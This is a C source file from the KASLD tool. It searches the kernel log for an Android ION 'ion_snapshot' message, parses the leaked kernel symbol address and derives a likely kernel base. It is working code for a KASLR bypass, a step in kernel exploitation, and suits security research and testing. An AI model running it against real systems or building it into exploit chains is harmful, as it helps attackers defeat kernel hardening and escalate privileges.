// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for Android ION ion_snapshot map message which
// prints last_ion_buf symbol address:
//
//   ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374
//
// Android ION drivers were removed in kernel v5.11-rc1.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://lwn.net/Articles/576966/
// https://lwn.net/Articles/565469/
// https://lwn.net/Articles/480055/
// https://elixir.bootlin.com/linux/v5.10.89/source/drivers/staging/android/ion
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include "kasld.h"

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char **buffer, int *size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long search_dmesg_ion_snapshot() {
  char *addr_buf;
  char *line_buf;
  char *substr;
  char *syslog;
  char *endptr;
  const char *needle1 = "ion_snapshot: ";
  const char *needle2 = "and copy to 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for '%s' ...\n", needle1);

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = (char *)memmem(&syslog[0], size, needle1, strlen(needle1));
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  addr_buf = strstr(substr, needle2);
  if (addr_buf == NULL)
    return 0;

  addr = strtoull(&addr_buf[strlen(needle2)], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_ion_snapshot();
  if (!addr)
    return 1;

  printf("leaked last_ion_buf: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
